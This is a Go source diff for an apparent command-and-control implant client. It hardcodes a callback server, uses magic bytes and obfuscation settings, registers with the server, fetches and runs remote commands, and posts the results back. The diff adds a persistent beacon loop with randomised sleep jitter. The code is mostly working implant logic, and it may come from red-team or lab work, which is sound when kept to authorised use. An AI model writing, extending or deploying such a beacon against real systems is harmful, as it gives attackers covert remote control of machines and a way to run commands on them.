@@ -4,11 +4,14 @@ import (
 	"bytes"
 	"github.com/degenerat3/metcli"
 	"io/ioutil"
+	"math/rand"
 	"net/http"
+	"os"
+	"time"
 )
 
-// LFSERV : server to call
-var LFSERV = "http://192.168.206.183:8080"
+// SERV : server to call
+var SERV = "http://192.168.206.183:8080"
 
 // MAGIC : the shared hex byte that will signify the start of each MAD payload
 var MAGIC = []byte{0xAA}
@@ -44,7 +47,7 @@ var OBFSEED = 5
 var OBFTEXT = "test"
 
 func postPayload(data string, m metcli.Metclient) string {
-	url := LFSERV + "/communicate"
+	url := SERV + "/communicate"
 	prejson := `{"comms":"` + data + `"}`
 	jsonStr := []byte(prejson)
 	cli := http.Client{}
@@ -64,15 +67,27 @@ func postPayload(data string, m metcli.Metclient) string {
 
 //run everything
 func main() {
-	m := metcli.GenClient(LFSERV, MAGIC, MAGICSTR, MAGICTERM, MAGICTERMSTR, REGFILE, INTERVAL, DELTA, OBFSEED, OBFTEXT)
-	p := metcli.PreCheck(m)
-	if p != "registered" {
-		postPayload(p, m)
+	argslen := len(os.Args)
+	m := metcli.GenClient(SERV, MAGIC, MAGICSTR, MAGICTERM, MAGICTERMSTR, REGFILE, INTERVAL, DELTA, OBFSEED, OBFTEXT)
+
+	for {
+		p := metcli.PreCheck(m)
+		if p != "registered" {
+			postPayload(p, m)
+		}
+		comPL := metcli.GenGetComPL(m)
+		comstr := postPayload(comPL, m)
+		res := metcli.HandleComs(comstr, m)
+		if len(res) > 0 {
+			postPayload(res, m)
+		}
+		if argslen < 2 {
+			os.Exit(0)
+		}
+		min := INTERVAL - DELTA
+		max := INTERVAL + DELTA
+		sleeptime := rand.Intn(max-min) + min
+		time.Sleep(time.Duration(sleeptime) * time.Second)
 	}
-	comPL := metcli.GenGetComPL(m)
-	comstr := postPayload(comPL, m)
-	res := metcli.HandleComs(comstr, m)
-	if len(res) > 0 {
-		postPayload(res, m)
-	}
+
 }
